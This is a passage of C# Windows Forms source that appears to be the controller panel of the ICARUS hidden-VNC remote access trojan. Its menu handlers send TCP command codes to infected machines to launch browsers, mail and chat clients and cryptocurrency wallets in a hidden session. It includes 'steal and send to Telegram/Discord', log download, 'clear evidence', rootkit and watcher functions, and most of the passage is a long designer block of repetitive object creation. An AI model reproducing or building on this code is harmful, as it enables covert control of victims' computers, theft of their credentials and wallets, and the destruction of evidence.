                controlPanelToolStripMenuItem.Text = "Control Stopped";
            }
        }

        private void studioButton8_Click_1(object sender, EventArgs e)
		{
			new Help().ShowDialog();
		}

		private void studioButton10_Click(object sender, EventArgs e)
		{
			this.contextMenuStrip6.Show(this.studioButton10, 0, this.studioButton10.Height);
		}

		private void stealAndSendToTelegramToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.TGDC0.IsDisposed)
			{
				this.TGDC0 = new TGtoDSC();
			}
			this.TGDC0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            TGDC0.Text = Text.Replace("{ ICARUS 1.0.0.5 - Connected: Admin } - ", null);
			this.TGDC0.Show();
		}

		private void stealAndSendToDiscordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.TGDC0.IsDisposed)
			{
				this.TGDC0 = new TGtoDSC();
			}
			this.TGDC0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            TGDC0.Text = Text.Replace("{ ICARUS 1.0.0.5 - Connected: Admin } - ", null);
			this.TGDC0.Show();
		}

        private void comodoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!comodoToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("996*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                comodoToolStripMenuItem.Text = "Comodo Started";
            }
            else
            {
                SendTCP("2057*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                comodoToolStripMenuItem.Text = "Comodo Stopped";
            }
        }

        private void yandexToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!yandexToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("1006*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                yandexToolStripMenuItem.Text = "Yandex Started";
            }
            else
            {
                SendTCP("2056*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                yandexToolStripMenuItem.Text = "Yandex Stopped";
            }
        }

        private void operaNeonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!operaNeonToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("998*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                operaNeonToolStripMenuItem.Text = "OperaNeon Started";
            }
            else
            {
                SendTCP("2060*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                operaNeonToolStripMenuItem.Text = "OperaNeon Stopped";
            }
        }

        private void waterFoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!waterFoxToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("1005*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                waterFoxToolStripMenuItem.Text = "Waterfox Started";
            }
            else
            {
                SendTCP("2061*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                waterFoxToolStripMenuItem.Text = "Waterfox Stopped";
            }
        }

        private void orbitumToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!orbitumToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("999*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                orbitumToolStripMenuItem.Text = "Orbitum Started";
            }
            else
            {
                SendTCP("2062*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                orbitumToolStripMenuItem.Text = "Orbitum Stopped";
            }
        }

        private void atomToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!atomToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("992*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                atomToolStripMenuItem.Text = "Atom Started";
            }
            else
            {
                SendTCP("2063*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                atomToolStripMenuItem.Text = "Atom Stopped";
            }
        }

        private void slimjetToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!slimjetToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("1001*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                slimjetToolStripMenuItem.Text = "Slimjet Started";
            }
            else
            {
                SendTCP("2064*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                slimjetToolStripMenuItem.Text = "Slimjet Stopped";
            }
        }

        private void dingTalkToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (!dingTalkToolStripMenuItem.Text.Contains("Started"))
            {
                SendTCP("2058*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                dingTalkToolStripMenuItem.Text = "DingTalk Started";
            }
            else
            {
                SendTCP("2059*" + Conversions.ToString(Value: false), (TcpClient)Tag);
                dingTalkToolStripMenuItem.Text = "DingTalk Stopped";
            }
        }

        private void downloadLogsViaSocketToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("2065*" + Conversions.ToString(Value: false), (TcpClient)Tag);
        }

        private void clearEvidenceToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendTCP("2066*" + Conversions.ToString(Value: false), (TcpClient)Tag);
        }

        private void studioButton11_Click(object sender, EventArgs e)
        {
            SendTCP("8587*", (TcpClient)Tag);
        }

        protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			BloomBrain bloom = new BloomBrain();
			BloomBrain bloom2 = new BloomBrain();
			BloomBrain bloom3 = new BloomBrain();
			BloomBrain bloom4 = new BloomBrain();
			BloomBrain bloom5 = new BloomBrain();
			BloomBrain bloom6 = new BloomBrain();
			BloomBrain bloom7 = new BloomBrain();
			BloomBrain bloom8 = new BloomBrain();
			BloomBrain bloom9 = new BloomBrain();
			BloomBrain bloom10 = new BloomBrain();
			BloomBrain bloom11 = new BloomBrain();
			BloomBrain bloom12 = new BloomBrain();
			BloomBrain bloom13 = new BloomBrain();
			BloomBrain bloom14 = new BloomBrain();
			BloomBrain bloom15 = new BloomBrain();
			BloomBrain bloom16 = new BloomBrain();
			BloomBrain bloom17 = new BloomBrain();
			BloomBrain bloom18 = new BloomBrain();
			BloomBrain bloom19 = new BloomBrain();
			BloomBrain bloom20 = new BloomBrain();
			BloomBrain bloom21 = new BloomBrain();
			BloomBrain bloom22 = new BloomBrain();
			BloomBrain bloom23 = new BloomBrain();
			BloomBrain bloom24 = new BloomBrain();
			BloomBrain bloom25 = new BloomBrain();
			BloomBrain bloom26 = new BloomBrain();
			BloomBrain bloom27 = new BloomBrain();
			BloomBrain bloom28 = new BloomBrain();
			BloomBrain bloom29 = new BloomBrain();
			BloomBrain bloom30 = new BloomBrain();
			BloomBrain bloom31 = new BloomBrain();
			BloomBrain bloom32 = new BloomBrain();
			BloomBrain bloom33 = new BloomBrain();
			BloomBrain bloom34 = new BloomBrain();
			BloomBrain bloom35 = new BloomBrain();
			BloomBrain bloom36 = new BloomBrain();
			BloomBrain bloom37 = new BloomBrain();
			BloomBrain bloom38 = new BloomBrain();
			BloomBrain bloom39 = new BloomBrain();
			BloomBrain bloom40 = new BloomBrain();
			BloomBrain bloom41 = new BloomBrain();
			BloomBrain bloom42 = new BloomBrain();
			BloomBrain bloom43 = new BloomBrain();
			BloomBrain bloom44 = new BloomBrain();
			BloomBrain bloom45 = new BloomBrain();
			BloomBrain bloom46 = new BloomBrain();
			BloomBrain bloom47 = new BloomBrain();
			BloomBrain bloom48 = new BloomBrain();
			BloomBrain bloom49 = new BloomBrain();
			BloomBrain bloom50 = new BloomBrain();
			BloomBrain bloom51 = new BloomBrain();
			BloomBrain bloom52 = new BloomBrain();
			BloomBrain bloom53 = new BloomBrain();
			BloomBrain bloom54 = new BloomBrain();
			BloomBrain bloom55 = new BloomBrain();
			BloomBrain bloom56 = new BloomBrain();
			BloomBrain bloom57 = new BloomBrain();
			BloomBrain bloom58 = new BloomBrain();
			BloomBrain bloom59 = new BloomBrain();
			BloomBrain bloom60 = new BloomBrain();
			BloomBrain bloom61 = new BloomBrain();
			BloomBrain bloom62 = new BloomBrain();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.hVNC));
			BloomBrain bloom63 = new BloomBrain();
			BloomBrain bloom64 = new BloomBrain();
			BloomBrain bloom65 = new BloomBrain();
			BloomBrain bloom66 = new BloomBrain();
			BloomBrain bloom67 = new BloomBrain();
			BloomBrain bloom68 = new BloomBrain();
			BloomBrain bloom69 = new BloomBrain();
			BloomBrain bloom70 = new BloomBrain();
			BloomBrain bloom71 = new BloomBrain();
			BloomBrain bloom72 = new BloomBrain();
			BloomBrain bloom73 = new BloomBrain();
			BloomBrain bloom74 = new BloomBrain();
			BloomBrain bloom75 = new BloomBrain();
			BloomBrain bloom76 = new BloomBrain();
			BloomBrain bloom77 = new BloomBrain();
			BloomBrain bloom78 = new BloomBrain();
			BloomBrain bloom79 = new BloomBrain();
			BloomBrain bloom80 = new BloomBrain();
			BloomBrain bloom81 = new BloomBrain();
			BloomBrain bloom82 = new BloomBrain();
			BloomBrain bloom83 = new BloomBrain();
			BloomBrain bloom84 = new BloomBrain();
			BloomBrain bloom85 = new BloomBrain();
			BloomBrain bloom86 = new BloomBrain();
			BloomBrain bloom87 = new BloomBrain();
			BloomBrain bloom88 = new BloomBrain();
			BloomBrain bloom89 = new BloomBrain();
			BloomBrain bloom90 = new BloomBrain();
			BloomBrain bloom91 = new BloomBrain();
			BloomBrain bloom92 = new BloomBrain();
			BloomBrain bloom93 = new BloomBrain();
			BloomBrain bloom94 = new BloomBrain();
			BloomBrain bloom95 = new BloomBrain();
			BloomBrain bloom96 = new BloomBrain();
			BloomBrain bloom97 = new BloomBrain();
			BloomBrain bloom98 = new BloomBrain();
			BloomBrain bloom99 = new BloomBrain();
			BloomBrain bloom100 = new BloomBrain();
			BloomBrain bloom101 = new BloomBrain();
			BloomBrain bloom102 = new BloomBrain();
			BloomBrain bloom103 = new BloomBrain();
			BloomBrain bloom104 = new BloomBrain();
			BloomBrain bloom105 = new BloomBrain();
			BloomBrain bloom106 = new BloomBrain();
			BloomBrain bloom107 = new BloomBrain();
			BloomBrain bloom108 = new BloomBrain();
			BloomBrain bloom109 = new BloomBrain();
			BloomBrain bloom110 = new BloomBrain();
			BloomBrain bloom111 = new BloomBrain();
			BloomBrain bloom112 = new BloomBrain();
			BloomBrain bloom113 = new BloomBrain();
			BloomBrain bloom114 = new BloomBrain();
			BloomBrain bloom115 = new BloomBrain();
			BloomBrain bloom116 = new BloomBrain();
			BloomBrain bloom117 = new BloomBrain();
			BloomBrain bloom118 = new BloomBrain();
			BloomBrain bloom119 = new BloomBrain();
			BloomBrain bloom120 = new BloomBrain();
			BloomBrain bloom121 = new BloomBrain();
			BloomBrain bloom122 = new BloomBrain();
			BloomBrain bloom123 = new BloomBrain();
			BloomBrain bloom124 = new BloomBrain();
			BloomBrain bloom125 = new BloomBrain();
			BloomBrain bloom126 = new BloomBrain();
			BloomBrain bloom127 = new BloomBrain();
			BloomBrain bloom128 = new BloomBrain();
			BloomBrain bloom129 = new BloomBrain();
			BloomBrain bloom130 = new BloomBrain();
			BloomBrain bloom131 = new BloomBrain();
			BloomBrain bloom132 = new BloomBrain();
			BloomBrain bloom133 = new BloomBrain();
			BloomBrain bloom134 = new BloomBrain();
			BloomBrain bloom135 = new BloomBrain();
			BloomBrain bloom136 = new BloomBrain();
			BloomBrain bloom137 = new BloomBrain();
			BloomBrain bloom138 = new BloomBrain();
			BloomBrain bloom139 = new BloomBrain();
			BloomBrain bloom140 = new BloomBrain();
			BloomBrain bloom141 = new BloomBrain();
			BloomBrain bloom142 = new BloomBrain();
			BloomBrain bloom143 = new BloomBrain();
			BloomBrain bloom144 = new BloomBrain();
			BloomBrain bloom145 = new BloomBrain();
			BloomBrain bloom146 = new BloomBrain();
			BloomBrain bloom147 = new BloomBrain();
			BloomBrain bloom148 = new BloomBrain();
			BloomBrain bloom149 = new BloomBrain();
			BloomBrain bloom150 = new BloomBrain();
			BloomBrain bloom151 = new BloomBrain();
			BloomBrain bloom152 = new BloomBrain();
			BloomBrain bloom153 = new BloomBrain();
			BloomBrain bloom154 = new BloomBrain();
			BloomBrain bloom155 = new BloomBrain();
			BloomBrain bloom156 = new BloomBrain();
			BloomBrain bloom157 = new BloomBrain();
			BloomBrain bloom158 = new BloomBrain();
			BloomBrain bloom159 = new BloomBrain();
			BloomBrain bloom160 = new BloomBrain();
			BloomBrain bloom161 = new BloomBrain();
			BloomBrain bloom162 = new BloomBrain();
			BloomBrain bloom163 = new BloomBrain();
			BloomBrain bloom164 = new BloomBrain();
			BloomBrain bloom165 = new BloomBrain();
			BloomBrain bloom166 = new BloomBrain();
			BloomBrain bloom167 = new BloomBrain();
			BloomBrain bloom168 = new BloomBrain();
			BloomBrain bloom169 = new BloomBrain();
			BloomBrain bloom170 = new BloomBrain();
			BloomBrain bloom171 = new BloomBrain();
			BloomBrain bloom172 = new BloomBrain();
			BloomBrain bloom173 = new BloomBrain();
			BloomBrain bloom174 = new BloomBrain();
			BloomBrain bloom175 = new BloomBrain();
			BloomBrain bloom176 = new BloomBrain();
			BloomBrain bloom177 = new BloomBrain();
			BloomBrain bloom178 = new BloomBrain();
			BloomBrain bloom179 = new BloomBrain();
			BloomBrain bloom180 = new BloomBrain();
			BloomBrain bloom181 = new BloomBrain();
			BloomBrain bloom182 = new BloomBrain();
			BloomBrain bloom183 = new BloomBrain();
			BloomBrain bloom184 = new BloomBrain();
			BloomBrain bloom185 = new BloomBrain();
			BloomBrain bloom186 = new BloomBrain();
			BloomBrain bloom187 = new BloomBrain();
			BloomBrain bloom188 = new BloomBrain();
			BloomBrain bloom189 = new BloomBrain();
			BloomBrain bloom190 = new BloomBrain();
			BloomBrain bloom191 = new BloomBrain();
			BloomBrain bloom192 = new BloomBrain();
			BloomBrain bloom193 = new BloomBrain();
			BloomBrain bloom194 = new BloomBrain();
			BloomBrain bloom195 = new BloomBrain();
			BloomBrain bloom196 = new BloomBrain();
			BloomBrain bloom197 = new BloomBrain();
			BloomBrain bloom198 = new BloomBrain();
			BloomBrain bloom199 = new BloomBrain();
			BloomBrain bloom200 = new BloomBrain();
			BloomBrain bloom201 = new BloomBrain();
			BloomBrain bloom202 = new BloomBrain();
			BloomBrain bloom203 = new BloomBrain();
			BloomBrain bloom204 = new BloomBrain();
			BloomBrain bloom205 = new BloomBrain();
			BloomBrain bloom206 = new BloomBrain();
			BloomBrain bloom207 = new BloomBrain();
			BloomBrain bloom208 = new BloomBrain();
			BloomBrain bloom209 = new BloomBrain();
			BloomBrain bloom210 = new BloomBrain();
			BloomBrain bloom211 = new BloomBrain();
			BloomBrain bloom212 = new BloomBrain();
			BloomBrain bloom213 = new BloomBrain();
			BloomBrain bloom214 = new BloomBrain();
			BloomBrain bloom215 = new BloomBrain();
			BloomBrain bloom216 = new BloomBrain();
			BloomBrain bloom217 = new BloomBrain();
			BloomBrain bloom218 = new BloomBrain();
			BloomBrain bloom219 = new BloomBrain();
			BloomBrain bloom220 = new BloomBrain();
			BloomBrain bloom221 = new BloomBrain();
			BloomBrain bloom222 = new BloomBrain();
			BloomBrain bloom223 = new BloomBrain();
			BloomBrain bloom224 = new BloomBrain();
			BloomBrain bloom225 = new BloomBrain();
			BloomBrain bloom226 = new BloomBrain();
			BloomBrain bloom227 = new BloomBrain();
			BloomBrain bloom228 = new BloomBrain();
			BloomBrain bloom229 = new BloomBrain();
			BloomBrain bloom230 = new BloomBrain();
			BloomBrain bloom231 = new BloomBrain();
			BloomBrain bloom232 = new BloomBrain();
			BloomBrain bloom233 = new BloomBrain();
			BloomBrain bloom234 = new BloomBrain();
			BloomBrain bloom235 = new BloomBrain();
			BloomBrain bloom236 = new BloomBrain();
			BloomBrain bloom237 = new BloomBrain();
			BloomBrain bloom238 = new BloomBrain();
			BloomBrain bloom239 = new BloomBrain();
			BloomBrain bloom240 = new BloomBrain();
			BloomBrain bloom241 = new BloomBrain();
			BloomBrain bloom242 = new BloomBrain();
			BloomBrain bloom243 = new BloomBrain();
			BloomBrain bloom244 = new BloomBrain();
			BloomBrain bloom245 = new BloomBrain();
			BloomBrain bloom246 = new BloomBrain();
			BloomBrain bloom247 = new BloomBrain();
			BloomBrain bloom248 = new BloomBrain();
			BloomBrain bloom249 = new BloomBrain();
			BloomBrain bloom250 = new BloomBrain();
			BloomBrain bloom251 = new BloomBrain();
			BloomBrain bloom252 = new BloomBrain();
			BloomBrain bloom253 = new BloomBrain();
			BloomBrain bloom254 = new BloomBrain();
			BloomBrain bloom255 = new BloomBrain();
			BloomBrain bloom256 = new BloomBrain();
			BloomBrain bloom257 = new BloomBrain();
			this.timer1 = new System.Windows.Forms.Timer(this.components);
			this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.closeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
			this.toolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
			this.timer2 = new System.Windows.Forms.Timer(this.components);
			this.contextMenuStrip2 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.electrumToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.armoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.GuardaItem = new System.Windows.Forms.ToolStripMenuItem();
			this.coinomiToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.exodusToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.atomicToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.jaxxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.contextMenuStrip3 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.outlookToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.foxmailToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.thunderbirdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.skypeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.discordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.telegramToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.dingTalkToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.contextMenuStrip4 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.btnChrome = new System.Windows.Forms.ToolStripMenuItem();
			this.btnEdge = new System.Windows.Forms.ToolStripMenuItem();
			this.btnFirefox = new System.Windows.Forms.ToolStripMenuItem();
			this.btnBrave = new System.Windows.Forms.ToolStripMenuItem();
			this.btnEpic = new System.Windows.Forms.ToolStripMenuItem();
			this.btnVivaldi = new System.Windows.Forms.ToolStripMenuItem();
			this.btn360 = new System.Windows.Forms.ToolStripMenuItem();
			this.btnSputnik = new System.Windows.Forms.ToolStripMenuItem();
			this.comodoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.yandexToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.operaNeonToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.waterFoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.orbitumToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.atomToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.slimjetToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.contextMenuStrip5 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.msinfo32exeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.mstscexeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.notepadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.controlPanelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.timer3 = new System.Windows.Forms.Timer(this.components);
			this.contextMenuStrip6 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.stealAndSendToTelegramToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.stealAndSendToDiscordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.downloadLogsViaSocketToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.clearEvidenceToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.primeTheme1 = new PrimeTheme();
			this.studioButton11 = new StudioButton();
			this.studioButton10 = new StudioButton();
			this.studioButton8 = new StudioButton();
			this.studioButton6 = new StudioButton();
			this.VNCBox = new System.Windows.Forms.PictureBox();
			this.studioButton2 = new StudioButton();
			this.btnElectrum = new StudioButton();
			this.btnRootkit = new StudioButton();
			this.btnWatcher = new StudioButton();
			this.label1 = new System.Windows.Forms.Label();
			this.chkClone = new JCS.ToggleSwitch();
			this.studioButton1 = new StudioButton();
			this.btnPaste = new StudioButton();
			this.btnCopy = new StudioButton();
			this.btnEx = new StudioButton();
			this.btnCMD = new StudioButton();
			this.btnPowershell = new StudioButton();
			this.button3 = new System.Windows.Forms.Button();
			this.ShowStart = new System.Windows.Forms.Button();
			this.MinBtn = new System.Windows.Forms.Button();
			this.RestoreMaxBtn = new System.Windows.Forms.Button();
			this.CloseBtn = new System.Windows.Forms.Button();
			this.pictureBox1 = new System.Windows.Forms.PictureBox();
			this.studioButton5 = new StudioButton();
			this.studioButton4 = new StudioButton();
			this.studioButton3 = new StudioButton();
			this.statusStrip1 = new System.Windows.Forms.StatusStrip();
			this.groupBox6 = new System.Windows.Forms.GroupBox();
			this.IntervalScroll = new System.Windows.Forms.TrackBar();
			this.ResizeLabel = new System.Windows.Forms.Label();
			this.QualityLabel = new System.Windows.Forms.Label();
			this.IntervalLabel = new System.Windows.Forms.Label();
			this.QualityScroll = new System.Windows.Forms.TrackBar();
			this.ResizeScroll = new System.Windows.Forms.TrackBar();
			this.label3 = new System.Windows.Forms.Label();
			this.studioButton9 = new StudioButton();
			this.studioButton7 = new StudioButton();
			this.label2 = new System.Windows.Forms.Label();
			this.contextMenuStrip1.SuspendLayout();
			this.contextMenuStrip2.SuspendLayout();
			this.contextMenuStrip3.SuspendLayout();
			this.contextMenuStrip4.SuspendLayout();
			this.contextMenuStrip5.SuspendLayout();
			this.contextMenuStrip6.SuspendLayout();
			this.primeTheme1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.VNCBox).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
			this.groupBox6.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)this.IntervalScroll).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.QualityScroll).BeginInit();
			((System.ComponentModel.ISupportInitialize)this.ResizeScroll).BeginInit();
			base.SuspendLayout();
			this.timer1.Tick += new System.EventHandler(timer1_Tick);
			this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.closeToolStripMenuItem });
			this.contextMenuStrip1.Name = "contextMenuStrip1";
			this.contextMenuStrip1.Size = new System.Drawing.Size(165, 26);
			this.closeToolStripMenuItem.Name = "closeToolStripMenuItem";
			this.closeToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
			this.closeToolStripMenuItem.Text = "Close Connexion";
			this.closeToolStripMenuItem.Click += new System.EventHandler(closeToolStripMenuItem_Click);
			this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
			this.toolStripStatusLabel1.Size = new System.Drawing.Size(44, 17);
			this.toolStripStatusLabel1.Text = "Status :";
			this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
			this.toolStripStatusLabel2.Size = new System.Drawing.Size(26, 17);
			this.toolStripStatusLabel2.Text = "Idle";
			this.timer2.Enabled = true;
			this.timer2.Interval = 1000;
			this.timer2.Tick += new System.EventHandler(timer2_Tick);
			this.contextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.electrumToolStripMenuItem, this.armoryToolStripMenuItem, this.GuardaItem, this.coinomiToolStripMenuItem, this.exodusToolStripMenuItem, this.atomicToolStripMenuItem, this.jaxxToolStripMenuItem });
			this.contextMenuStrip2.Name = "contextMenuStrip1";
			this.contextMenuStrip2.Size = new System.Drawing.Size(122, 158);
			this.electrumToolStripMenuItem.Name = "electrumToolStripMenuItem";
			this.electrumToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
			this.electrumToolStripMenuItem.Text = "Electrum";
			this.electrumToolStripMenuItem.Click += new System.EventHandler(electrumToolStripMenuItem_Click);
			this.armoryToolStripMenuItem.Name = "armoryToolStripMenuItem";
			this.armoryToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
			this.armoryToolStripMenuItem.Text = "Armory";
			this.armoryToolStripMenuItem.Click += new System.EventHandler(armoryToolStripMenuItem_Click);
			this.GuardaItem.Name = "GuardaItem";
			this.GuardaItem.Size = new System.Drawing.Size(121, 22);
			this.GuardaItem.Text = "Guarda";
			this.GuardaItem.Click += new System.EventHandler(GuardaItem_Click);
			this.coinomiToolStripMenuItem.Name = "coinomiToolStripMenuItem";
			this.coinomiToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
			this.coinomiToolStripMenuItem.Text = "Coinomi";
			this.coinomiToolStripMenuItem.Click += new System.EventHandler(coinomiToolStripMenuItem_Click);
			this.exodusToolStripMenuItem.Name = "exodusToolStripMenuItem";
			this.exodusToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
			this.exodusToolStripMenuItem.Text = "Exodus";
			this.exodusToolStripMenuItem.Click += new System.EventHandler(exodusToolStripMenuItem_Click);
			this.atomicToolStripMenuItem.Name = "atomicToolStripMenuItem";
			this.atomicToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
			this.atomicToolStripMenuItem.Text = "Atomic";
			this.atomicToolStripMenuItem.Click += new System.EventHandler(atomicToolStripMenuItem_Click);
			this.jaxxToolStripMenuItem.Name = "jaxxToolStripMenuItem";
			this.jaxxToolStripMenuItem.Size = new System.Drawing.Size(121, 22);
			this.jaxxToolStripMenuItem.Text = "Jaxx";
			this.jaxxToolStripMenuItem.Click += new System.EventHandler(jaxxToolStripMenuItem_Click);
			this.contextMenuStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.outlookToolStripMenuItem, this.foxmailToolStripMenuItem, this.thunderbirdToolStripMenuItem, this.skypeToolStripMenuItem, this.discordToolStripMenuItem, this.telegramToolStripMenuItem, this.dingTalkToolStripMenuItem });
			this.contextMenuStrip3.Name = "contextMenuStrip1";
			this.contextMenuStrip3.Size = new System.Drawing.Size(140, 158);
			this.outlookToolStripMenuItem.Name = "outlookToolStripMenuItem";
			this.outlookToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
			this.outlookToolStripMenuItem.Text = "Outlook";
			this.outlookToolStripMenuItem.Click += new System.EventHandler(outlookToolStripMenuItem_Click_1);
			this.foxmailToolStripMenuItem.Name = "foxmailToolStripMenuItem";
			this.foxmailToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
			this.foxmailToolStripMenuItem.Text = "Foxmail";
			this.foxmailToolStripMenuItem.Click += new System.EventHandler(foxmailToolStripMenuItem_Click_1);
			this.thunderbirdToolStripMenuItem.Name = "thunderbirdToolStripMenuItem";
			this.thunderbirdToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
			this.thunderbirdToolStripMenuItem.Text = "Thunderbird";
			this.thunderbirdToolStripMenuItem.Click += new System.EventHandler(thunderbirdToolStripMenuItem_Click_1);
			this.skypeToolStripMenuItem.Name = "skypeToolStripMenuItem";
			this.skypeToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
			this.skypeToolStripMenuItem.Text = "Skype";
			this.skypeToolStripMenuItem.Click += new System.EventHandler(skypeToolStripMenuItem_Click);
			this.discordToolStripMenuItem.Name = "discordToolStripMenuItem";
			this.discordToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
			this.discordToolStripMenuItem.Text = "Discord";
			this.discordToolStripMenuItem.Click += new System.EventHandler(discordToolStripMenuItem_Click);
			this.telegramToolStripMenuItem.Name = "telegramToolStripMenuItem";
			this.telegramToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
			this.telegramToolStripMenuItem.Text = "Telegram";
			this.telegramToolStripMenuItem.Click += new System.EventHandler(telegramToolStripMenuItem_Click);
			this.dingTalkToolStripMenuItem.Name = "dingTalkToolStripMenuItem";
			this.dingTalkToolStripMenuItem.Size = new System.Drawing.Size(139, 22);
			this.dingTalkToolStripMenuItem.Text = "DingTalk";
			this.dingTalkToolStripMenuItem.Click += new System.EventHandler(dingTalkToolStripMenuItem_Click);
			this.contextMenuStrip4.Items.AddRange(new System.Windows.Forms.ToolStripItem[15]
			{
				this.btnChrome, this.btnEdge, this.btnFirefox, this.btnBrave, this.btnEpic, this.btnVivaldi, this.btn360, this.btnSputnik, this.comodoToolStripMenuItem, this.yandexToolStripMenuItem,
				this.operaNeonToolStripMenuItem, this.waterFoxToolStripMenuItem, this.orbitumToolStripMenuItem, this.atomToolStripMenuItem, this.slimjetToolStripMenuItem
			});
			this.contextMenuStrip4.Name = "contextMenuStrip1";
			this.contextMenuStrip4.Size = new System.Drawing.Size(139, 334);
			this.btnChrome.Name = "btnChrome";
			this.btnChrome.Size = new System.Drawing.Size(138, 22);
			this.btnChrome.Text = "Chrome";
			this.btnChrome.Click += new System.EventHandler(btnChrome_Click);
			this.btnEdge.Name = "btnEdge";
			this.btnEdge.Size = new System.Drawing.Size(138, 22);
			this.btnEdge.Text = "Edge";
			this.btnEdge.Click += new System.EventHandler(btnEdge_Click);
			this.btnFirefox.Name = "btnFirefox";
			this.btnFirefox.Size = new System.Drawing.Size(138, 22);
			this.btnFirefox.Text = "Firefox";
			this.btnFirefox.Click += new System.EventHandler(btnFirefox_Click);
			this.btnBrave.Name = "btnBrave";
			this.btnBrave.Size = new System.Drawing.Size(138, 22);
			this.btnBrave.Text = "Brave";
			this.btnBrave.Click += new System.EventHandler(btnBrave_Click);
